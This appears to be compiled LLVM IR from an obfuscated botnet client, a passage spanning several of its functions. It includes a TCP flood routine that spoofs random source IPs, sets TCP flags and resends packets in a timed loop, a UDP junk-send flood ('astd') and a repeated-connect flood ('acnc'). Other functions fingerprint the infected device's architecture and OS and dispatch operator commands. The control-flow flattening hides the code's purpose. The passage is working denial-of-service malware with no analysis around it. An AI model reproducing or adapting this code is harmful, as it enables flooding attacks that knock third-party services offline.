; <label>:195:                                    ; preds = %loopEntry
  %196 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 0
  %198 = bitcast %union.anon.1* %197 to %struct.anon.2*
  %199 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %198, i32 0, i32 4
  %200 = load i16, i16* %199, align 4
  %201 = and i16 %200, -257
  %202 = or i16 %201, 256
  store i16 %202, i16* %199, align 4
  store i32 -721643394, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load i8*, i8** %23, align 8
  %205 = call i32 @strcmp(i8* %204, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i32 0, i32 0)) #10
  %206 = icmp ne i32 %205, 0
  %207 = select i1 %206, i32 309503539, i32 781534717
  store i32 %207, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %210 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %209, i32 0, i32 0
  %211 = bitcast %union.anon.1* %210 to %struct.anon.2*
  %212 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %211, i32 0, i32 4
  %213 = load i16, i16* %212, align 4
  %214 = and i16 %213, -4097
  %215 = or i16 %214, 4096
  store i16 %215, i16* %212, align 4
  store i32 -1867811009, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = load i8*, i8** %23, align 8
  %218 = call i32 @strcmp(i8* %217, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i32 0, i32 0)) #10
  %219 = icmp ne i32 %218, 0
  %220 = select i1 %219, i32 27617478, i32 1801344140
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 0
  %224 = bitcast %union.anon.1* %223 to %struct.anon.2*
  %225 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %224, i32 0, i32 4
  %226 = load i16, i16* %225, align 4
  %227 = and i16 %226, -2049
  %228 = or i16 %227, 2048
  store i16 %228, i16* %225, align 4
  store i32 550224984, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  store i32 550224984, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  store i32 -1867811009, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  store i32 -721643394, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  store i32 1697478687, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  store i32 -1655989351, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %235, i8** %23, align 8
  store i32 1046558847, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  store i32 -563854873, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = call i32 @rand_cmwc()
  %239 = trunc i32 %238 to i16
  %240 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  %242 = bitcast %union.anon.1* %241 to %struct.anon.2*
  %243 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %242, i32 0, i32 5
  store i16 %239, i16* %243, align 2
  %244 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 0
  %246 = bitcast %union.anon.1* %245 to %struct.anon.2*
  %247 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %246, i32 0, i32 6
  store i16 0, i16* %247, align 4
  %248 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 0
  %250 = bitcast %union.anon.1* %249 to %struct.anon.2*
  %251 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %250, i32 0, i32 7
  store i16 0, i16* %251, align 2
  %252 = load i32, i32* %9, align 4
  %253 = icmp eq i32 %252, 0
  %254 = select i1 %253, i32 -1937936904, i32 398246137
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = call i32 @rand_cmwc()
  store i32 486816164, i32* %switchVar
  store i32 %256, i32* %.reg2mem10
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i32, i32* %9, align 4
  %259 = trunc i32 %258 to i16
  %260 = call zeroext i16 @htons(i16 zeroext %259) #9
  %261 = zext i16 %260 to i32
  store i32 486816164, i32* %switchVar
  store i32 %261, i32* %.reg2mem10
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %263 = trunc i32 %.reload11 to i16
  %264 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 0
  %266 = bitcast %union.anon.1* %265 to %struct.anon.2*
  %267 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %266, i32 0, i32 1
  store i16 %263, i16* %267, align 2
  %268 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %269 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %270 = call zeroext i16 @tcpcsum(%struct.iphdr* %268, %struct.tcphdr* %269)
  %271 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %272 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %271, i32 0, i32 0
  %273 = bitcast %union.anon.1* %272 to %struct.anon.2*
  %274 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %273, i32 0, i32 6
  store i16 %270, i16* %274, align 4
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %275 = bitcast i8* %.reload8 to i16*
  %276 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 2
  %278 = load i16, i16* %277, align 2
  %279 = zext i16 %278 to i32
  %280 = call zeroext i16 @csum(i16* %275, i32 %279)
  %281 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 7
  store i16 %280, i16* %282, align 2
  %283 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %284 = load i32, i32* %10, align 4
  %285 = add nsw i32 %283, %284
  store i32 %285, i32* %24, align 4
  store i32 0, i32* %25, align 4
  store i32 -1112051595, i32* %switchVar
  br label %loopEnd

; <label>:286:                                    ; preds = %loopEntry
  store i32 258199132, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i32, i32* %17, align 4
  %289 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %290 = call i64 @sendto(i32 %288, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %289, i32 16)
  %291 = load i32, i32* %19, align 4
  %292 = call i32 @getRandomIP(i32 %291)
  %293 = call i32 @htonl(i32 %292) #9
  %294 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i32 0, i32 8
  store i32 %293, i32* %295, align 4
  %296 = call i32 @rand_cmwc()
  %297 = trunc i32 %296 to i16
  %298 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %299 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %298, i32 0, i32 3
  store i16 %297, i16* %299, align 4
  %300 = call i32 @rand_cmwc()
  %301 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 0
  %303 = bitcast %union.anon.1* %302 to %struct.anon.2*
  %304 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %303, i32 0, i32 2
  store i32 %300, i32* %304, align 4
  %305 = call i32 @rand_cmwc()
  %306 = trunc i32 %305 to i16
  %307 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %308 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %307, i32 0, i32 0
  %309 = bitcast %union.anon.1* %308 to %struct.anon.2*
  %310 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %309, i32 0, i32 0
  store i16 %306, i16* %310, align 4
  %311 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %312 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %311, i32 0, i32 0
  %313 = bitcast %union.anon.1* %312 to %struct.anon.2*
  %314 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %313, i32 0, i32 6
  store i16 0, i16* %314, align 4
  %315 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %316 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %317 = call zeroext i16 @tcpcsum(%struct.iphdr* %315, %struct.tcphdr* %316)
  %318 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon.1* %319 to %struct.anon.2*
  %321 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %320, i32 0, i32 6
  store i16 %317, i16* %321, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %322 = bitcast i8* %.reload6 to i16*
  %323 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 2
  %325 = load i16, i16* %324, align 2
  %326 = zext i16 %325 to i32
  %327 = call zeroext i16 @csum(i16* %322, i32 %326)
  %328 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 7
  store i16 %327, i16* %329, align 2
  %330 = load i32, i32* %25, align 4
  %331 = load i32, i32* %15, align 4
  %332 = icmp eq i32 %330, %331
  %333 = select i1 %332, i32 638985965, i32 945936760
  store i32 %333, i32* %switchVar
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  %335 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %336 = load i32, i32* %24, align 4
  %337 = icmp sgt i32 %335, %336
  %338 = select i1 %337, i32 2044357398, i32 -1574162397
  store i32 %338, i32* %switchVar
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  store i32 1237465140, i32* %switchVar
  br label %loopEnd

; <label>:340:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i32 -1112051595, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i32, i32* %25, align 4
  %343 = add i32 %342, 1
  store i32 %343, i32* %25, align 4
  store i32 -1112051595, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %345)
  store i32 -1809774036, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %344, %341, %340, %339, %334, %287, %286, %262, %257, %255, %237, %236, %234, %233, %232, %231, %230, %229, %221, %216, %208, %203, %195, %190, %182, %177, %169, %164, %160, %157, %121, %73, %67, %66, %62, %61, %55, %54, %47, %46, %40, %35, %31, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #5

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @astd(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [5 x i8*], align 16
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %13 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %13, i32* %7, align 4
  %14 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %15 = sext i32 %14 to i64
  store i64 %15, i64* %8, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call %struct.hostent* @gethostbyname(i8* %16)
  store %struct.hostent* %17, %struct.hostent** %10, align 8
  %18 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = load %struct.hostent*, %struct.hostent** %10, align 8
  %20 = getelementptr inbounds %struct.hostent, %struct.hostent* %19, i32 0, i32 4
  %21 = load i8**, i8*** %20, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %25 = bitcast %struct.in_addr* %24 to i8*
  %26 = load %struct.hostent*, %struct.hostent** %10, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 3
  %28 = load i32, i32* %27, align 4
  %29 = sext i32 %28 to i64
  call void @bcopy(i8* %23, i8* %25, i64 %29) #6
  %30 = load %struct.hostent*, %struct.hostent** %10, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 2
  %32 = load i32, i32* %31, align 8
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %33, i16* %34, align 4
  %35 = load i32, i32* %5, align 4
  %36 = trunc i32 %35 to i16
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  store i32 0, i32* %11, align 4
  %switchVar = alloca i32
  store i32 -1518582941, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1518582941, label %38
    i32 -1353663110, label %61
    i32 -1581418489, label %64
    i32 1818307936, label %67
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = bitcast [5 x i8*]* %12 to i8*
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 40, i32 16, i1 false)
  %40 = bitcast i8* %39 to [5 x i8*]*
  %41 = getelementptr [5 x i8*], [5 x i8*]* %40, i32 0, i32 0
  store i8* getelementptr inbounds ([159 x i8], [159 x i8]* @.str.11, i32 0, i32 0), i8** %41
  %42 = getelementptr [5 x i8*], [5 x i8*]* %40, i32 0, i32 1
  store i8* getelementptr inbounds ([356 x i8], [356 x i8]* @.str.12, i32 0, i32 0), i8** %42
  %43 = getelementptr [5 x i8*], [5 x i8*]* %40, i32 0, i32 2
  store i8* getelementptr inbounds ([193 x i8], [193 x i8]* @.str.13, i32 0, i32 0), i8** %43
  %44 = getelementptr [5 x i8*], [5 x i8*]* %40, i32 0, i32 3
  store i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.14, i32 0, i32 0), i8** %44
  %45 = getelementptr [5 x i8*], [5 x i8*]* %40, i32 0, i32 4
  store i8* getelementptr inbounds ([193 x i8], [193 x i8]* @.str.15, i32 0, i32 0), i8** %45
  %46 = load i32, i32* %7, align 4
  %47 = getelementptr inbounds [5 x i8*], [5 x i8*]* %12, i32 0, i32 0
  %48 = bitcast i8** %47 to i8*
  %49 = call i64 @send(i32 %46, i8* %48, i64 1460, i32 0)
  %50 = load i32, i32* %7, align 4
  %51 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %52 = call i32 @connect(i32 %50, %struct.sockaddr* %51, i32 16)
  %53 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %54 = sext i32 %53 to i64
  %55 = load i64, i64* %8, align 8
  %56 = load i32, i32* %6, align 4
  %57 = sext i32 %56 to i64
  %58 = add nsw i64 %55, %57
  %59 = icmp sge i64 %54, %58
  %60 = select i1 %59, i32 -1353663110, i32 -1581418489
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = call i32 @close(i32 %62)
  call void @_exit(i32 0) #11
  unreachable

; <label>:64:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  %65 = load i32, i32* %11, align 4
  %66 = add i32 %65, 1
  store i32 %66, i32* %11, align 4
  store i32 -1518582941, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %64, %38, %switchDefault
  br label %loopEntry
}

declare %struct.hostent* @gethostbyname(i8*) #2

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @acnc(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %11 = load i32, i32* %6, align 4
  %12 = add nsw i32 %10, %11
  store i32 %12, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @inet_addr(i8* %13) #6
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %15, i32 0, i32 0
  store i32 %14, i32* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = load i32, i32* %5, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #9
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %switchVar = alloca i32
  store i32 945687591, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 945687591, label %22
    i32 -100565201, label %27
    i32 1969790574, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %7, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = icmp sgt i32 %23, %24
  %26 = select i1 %25, i32 -100565201, i32 1969790574
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %28, i32* %8, align 4
  %29 = load i32, i32* %8, align 4
  %30 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %31 = call i32 @connect(i32 %29, %struct.sockaddr* %30, i32 16)
  %32 = call i32 @sleep(i32 1)
  %33 = load i32, i32* %8, align 4
  %34 = call i32 @close(i32 %33)
  store i32 945687591, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %27, %22, %switchDefault
  br label %loopEntry
}

declare i32 @sleep(i32) #2

; Function Attrs: noinline nounwind uwtable
define i8* @getArch() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.16, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i8* @getBuildz() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.17, i32 0, i32 0), i32 0) #6
  store i32 %2, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -186932298, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -186932298, label %first
    i32 265279256, label %5
    i32 -1568087897, label %6
    i32 -1375989968, label %10
    i32 1583624279, label %11
    i32 -1575099284, label %15
    i32 1181412266, label %16
    i32 242495721, label %17
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %3 = icmp ne i32 %.reload, -1
  %4 = select i1 %3, i32 265279256, i32 -1568087897
  store i32 %4, i32* %switchVar
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.18, i32 0, i32 0), i8** %1, align 8
  store i32 242495721, i32* %switchVar
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0) #6
  %8 = icmp ne i32 %7, -1
  %9 = select i1 %8, i32 -1375989968, i32 1583624279
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.20, i32 0, i32 0), i8** %1, align 8
  store i32 242495721, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @access(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.21, i32 0, i32 0), i32 0) #6
  %13 = icmp ne i32 %12, -1
  %14 = select i1 %13, i32 -1575099284, i32 1181412266
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.22, i32 0, i32 0), i8** %1, align 8
  store i32 242495721, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.23, i32 0, i32 0), i8** %1, align 8
  store i32 242495721, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i8*, i8** %1, align 8
  ret i8* %18

loopEnd:                                          ; preds = %16, %15, %11, %10, %6, %5, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i8* @getPortz() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.17, i32 0, i32 0), i32 0) #6
  store i32 %2, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 736276408, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 736276408, label %first
    i32 366954941, label %5
    i32 1317959540, label %6
    i32 625423009, label %10
    i32 -1392090892, label %11
    i32 1363652108, label %15
    i32 1528821199, label %16
    i32 -47987888, label %17
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %3 = icmp ne i32 %.reload, -1
  %4 = select i1 %3, i32 366954941, i32 1317959540
  store i32 %4, i32* %switchVar
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.24, i32 0, i32 0), i8** %1, align 8
  store i32 -47987888, i32* %switchVar
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0) #6
  %8 = icmp ne i32 %7, -1
  %9 = select i1 %8, i32 625423009, i32 -1392090892
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.24, i32 0, i32 0), i8** %1, align 8
  store i32 -47987888, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @access(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.21, i32 0, i32 0), i32 0) #6
  %13 = icmp ne i32 %12, -1
  %14 = select i1 %13, i32 1363652108, i32 1528821199
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.25, i32 0, i32 0), i8** %1, align 8
  store i32 -47987888, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.24, i32 0, i32 0), i8** %1, align 8
  store i32 -47987888, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i8*, i8** %1, align 8
  ret i8* %18

loopEnd:                                          ; preds = %16, %15, %11, %10, %6, %5, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i8* @getOS() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.26, i32 0, i32 0), i32 0) #6
  store i32 %2, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1470119613, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1470119613, label %first
    i32 1553554705, label %5
    i32 830287562, label %6
    i32 1945185524, label %10
    i32 67487476, label %11
    i32 -1847445305, label %12
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %3 = icmp ne i32 %.reload, -1
  %4 = select i1 %3, i32 1553554705, i32 830287562
  store i32 %4, i32* %switchVar
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  store i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.27, i32 0, i32 0), i8** %1, align 8
  store i32 -1847445305, i32* %switchVar
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.28, i32 0, i32 0), i32 0) #6
  %8 = icmp ne i32 %7, -1
  %9 = select i1 %8, i32 1945185524, i32 67487476
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.29, i32 0, i32 0), i8** %1, align 8
  store i32 -1847445305, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.30, i32 0, i32 0), i8** %1, align 8
  store i32 -1847445305, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %1, align 8
  ret i8* %13

loopEnd:                                          ; preds = %11, %10, %6, %5, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i8*, align 8
  %36 = alloca i32, align 4
  %37 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.31, i32 0, i32 0)) #10
  store i32 %41, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1252006908, i32* %switchVar
  %.reg2mem2 = alloca i32
  %.reg2mem4 = alloca i32
  %.reg2mem6 = alloca i32
